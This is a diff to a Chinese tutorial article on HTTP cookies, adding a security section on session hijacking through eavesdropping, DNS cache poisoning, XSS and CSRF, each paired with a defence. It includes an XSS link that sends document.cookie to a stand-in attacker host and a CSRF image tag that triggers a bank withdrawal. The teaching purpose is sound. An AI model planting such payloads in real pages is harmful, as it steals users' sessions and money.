@@ -154,7 +154,7 @@ Set-Cookie: user="dunizb";like="a"; domain="advertisement.com"
 图（b）：用户访问服务器2的一个index.html页面，这个页面也和同一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad2.jpg，当请求这张ad2.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie
 
 ```
-Cookie:  user="dunizb"; like="a";
+Cookie:  user="dunizb"; like="a";
 ```
 
 www.advertisement.com收到浏览器发送的cookie识别了用户的身份，同时又把这个页面用户的浏览数据设置cookie
@@ -166,18 +166,50 @@ Set-Cookie: buy="b"; domain="advertisement.com"
 图（c）：很巧，用户访问服务器3的一个index.html页面，这个页面也和那一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad3.jpg，当请求这张ad3.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie
 
 ```
-Cookie:  user="dunizb"; like="a"; buy="b"
+Cookie:  user="dunizb"; like="a"; buy="b"
 ```
 
 这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。
 
 ## 六、安全
 
+多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种cookie盗用和会话劫持的例子
 
+### 网络窃听
 
+网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。
 
+解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。
 
+### DNS缓存中毒
 
+如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了，例如：攻击者使用DNS中毒来创建一个虚拟的NDS服务h123456.www.demo.com指向攻击者服务器的ip地址。然后攻击者可以从服务器 h123456.www.demo.com/img\_01.png 发布图片。用户访问这个图片，由于 www.demo.com和h123456.www.demo.com是同一个子域，所以浏览器会把用户的与www.demo.com相关的cookie都会发送到h123456.www.demo.com这个服务器上，这样攻击者就会拿到用户的cookie搞事情。
 
+一般情况下是不会发生这种情况，通常是网络供应商错误。
 
+### 跨站点脚本XSS
+
+使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。
+
+    <a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
+
+当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。
+
+解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。
+
+### 跨站请求伪造CSRF
+
+例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如，
+
+```
+<img src="http://www.bank.com/withdraw?user=SanShao&amount=999999&for=XiaoMing" >
+```
+
+如果XiaoHong的银行将其认证信息保存在cookie中，并且cookie尚未过期，\(当然是没有其他验证身份的东西\)，那么XiaoHong的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经XiaoHong批准的情况下授权交易。
+
+解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。
+
+---
+
+本文来自：《这一次带你彻底了解Cookie》[https://mp.weixin.qq.com/s?\_\_biz=MzU0OTExNzYwNg==&mid=2247484049&idx=1&sn=7817b2ff4906ea80e8cff00d60bbf83f&chksm=fbb58958ccc2004ebadaec87f35f79aca2c47b76408311dcf39433e62e25890a4a04e4d6b4b3&mpshare=1&scene=23&srcid=1208GPMMaM5aOrE1QqYtkAyg%23rd](https://mp.weixin.qq.com/s?__biz=MzU0OTExNzYwNg==&mid=2247484049&idx=1&sn=7817b2ff4906ea80e8cff00d60bbf83f&chksm=fbb58958ccc2004ebadaec87f35f79aca2c47b76408311dcf39433e62e25890a4a04e4d6b4b3&mpshare=1&scene=23&srcid=1208GPMMaM5aOrE1QqYtkAyg%23rd)
 
